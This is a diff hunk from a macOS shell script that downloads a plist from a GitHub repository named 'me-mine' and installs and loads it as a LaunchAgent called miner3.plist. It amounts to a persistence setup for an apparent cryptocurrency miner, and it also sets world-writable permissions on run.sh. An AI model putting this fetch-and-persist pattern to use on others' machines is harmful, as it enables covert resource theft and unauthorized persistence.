@@ -11,9 +11,9 @@ chmod 777 ~/Library/Launchagents/run.sh
 curl -L https://raw.githubusercontent.com/Me1955/me-mine/main/run.plist >> ~/Library/LaunchAgents/run.plist
 chmod 644 ~/Library/Launchagents/run.plist
 
-cat ~/Library/Launchagents/run.plist >> ~/Library/Launchagents/miner.plist
+cat ~/Library/Launchagents/run.plist >> ~/Library/Launchagents/miner3.plist
 rm ~/Library/Launchagents/run.plist
 
-chmod 644 ~/Library/Launchagents/miner.plist
+chmod 644 ~/Library/Launchagents/miner3.plist
 
-launchctl load ~/Library/LaunchAgents/miner.plist
+launchctl load ~/Library/LaunchAgents/miner3.plist
